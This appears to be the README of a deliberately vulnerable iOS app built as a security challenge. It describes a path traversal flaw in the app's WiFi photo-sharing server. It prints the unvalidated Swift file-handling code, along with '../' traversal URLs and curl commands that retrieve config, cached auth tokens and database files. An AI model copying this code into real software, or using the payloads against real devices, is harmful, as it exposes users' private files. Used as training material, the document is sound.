# oxo-ios-ben9: iOS Path Traversal Vulnerability

## Challenge Details

### Description

PhotoShare Studio is a modern iOS photo management application that provides users with comprehensive photo organization, album management, and wireless sharing capabilities. The app features a clean, intuitive interface following Apple's Human Interface Guidelines and includes professional-grade functionality for managing personal photo collections.

**Note**: This app mimics the functionality of popular apps like "Photo Transfer App" which create WiFi HTTP servers for wireless photo transfer via web browser - a common and realistic approach used by many App Store applications.

The application demonstrates a critical **iOS Path Traversal** vulnerability where the WiFi sharing server fails to properly validate file paths, allowing attackers to access files outside the intended directory through malformed paths containing `../` sequences or direct path manipulation.

Key features of the application:
- Photo album organization with customizable categories
- Professional photo management interface
- WiFi-based photo sharing for wireless device transfer
- Album browsing with collection view layouts
- Metadata management and file organization
- Secure local storage with intentional path validation flaw

### Vulnerability Type and Category
- **Type:** Path Traversal / Directory Traversal
- **Category:** Improper Input Validation (CWE-22)
- **Platform:** iOS (Swift/UIKit)

### Difficulty
Medium

## Vulnerability Overview

The application's WiFi sharing server processes file download requests without proper path validation, allowing attackers to traverse directories and access sensitive files outside the intended photo storage areas. This vulnerability affects the `WiFiSharingServer.swift` component where user-controlled file path parameters are directly concatenated with base directories.

**Attack Vector:  Path Traversal**

**Brief Explanation**: PhotoShare Studio provides a WiFi sharing feature that starts a local web server on port 8080. The server processes file download requests with user-supplied file names directly without validating if the requested paths stay within the intended album directories.


## Exploitation

### Attack Scenarios

**1. Malicious Network Access**
- Attacker connects to same WiFi network as victim
- Discovers device IP running PhotoShare Studio WiFi server
- Crafts malicious URLs to access files outside photo directories

**2. Path Traversal Examples**
```bash
# Access app settings (realistic iOS app file)
http://[device-ip]:8080/photo?file=../PhotoShare_Settings.plist

# Access cached authentication tokens
http://[device-ip]:8080/download?file=../cached_auth.json

# Access photo database
http://[device-ip]:8080/photo?file=../PhotoMetadata.sqlite

# Access backup manifest
http://[device-ip]:8080/download?file=../backup_manifest.plist
```

**3. Social Engineering**
- Send malicious links to target users
- Embed paths in shared content or messaging
- Exploit trust in legitimate-looking photo sharing URLs

### Testing Instructions

1. **Start the app** in iOS Simulator or on device
2. **Tap "Start WiFi Sharing"** to activate the vulnerable server
3. **Note the device IP address** from WiFi settings
4. **Open web browser** and navigate to `http://[device-ip]:8080`
5. **Exploit the vulnerability** using crafted URLs:

```bash
# From simulator terminal or browser
curl "http://127.0.0.1:8080/photo?file=../PhotoShare_Settings.plist"
curl "http://127.0.0.1:8080/download?file=../cached_auth.json"

# Browser exploitation examples
http://127.0.0.1:8080/photo?file=../PhotoMetadata.sqlite
http://127.0.0.1:8080/download?file=../backup_manifest.plist
```

**Expected Result:** Successfully retrieve files outside the intended Albums directory, including app configuration, user preferences, and cached sensitive data.

## Technical Details

### Vulnerable Code Locations

**Primary Vulnerability - WiFiSharingServer.swift:89-103**
```swift
// VULNERABLE: Direct path concatenation without validation
private func handleFileDownload(_ fileName: String) -> Data {
    let documentsPath = PhotoManager.shared.getDocumentsDirectory()
    let filePath = documentsPath.appendingPathComponent("Albums/\(fileName)")
    // No validation of fileName parameter allows path traversal
    
    if FileManager.default.fileExists(atPath: filePath.path) {
        let fileData = try Data(contentsOf: filePath)
        // Returns any accessible file
    }
}
```

**Secondary Vulnerability - WiFiSharingServer.swift:105-120**
```swift
// VULNERABLE: Even more direct path traversal
private func handlePhotoDownload(_ fileName: String) -> Data {
    let documentsPath = PhotoManager.shared.getDocumentsDirectory()
    let photoPath = documentsPath.appendingPathComponent(fileName)
    // Direct path concatenation without any directory restrictions
}
```

### Application Architecture
- **Language**: Swift
- **Framework**: UIKit with Storyboard
- **Networking**: Foundation Network framework for HTTP server
- **Storage**: NSFileManager for file system operations
- **UI Pattern**: Navigation controller with collection views

### Key Components
- `PhotoManager.swift` - File management and sample data creation
- `WiFiSharingServer.swift` - Vulnerable HTTP server implementation
- `ViewController.swift` - Main photo gallery interface
- `AlbumViewController.swift` - Individual album photo browsing
- `Main.storyboard` - Professional UI layout and navigation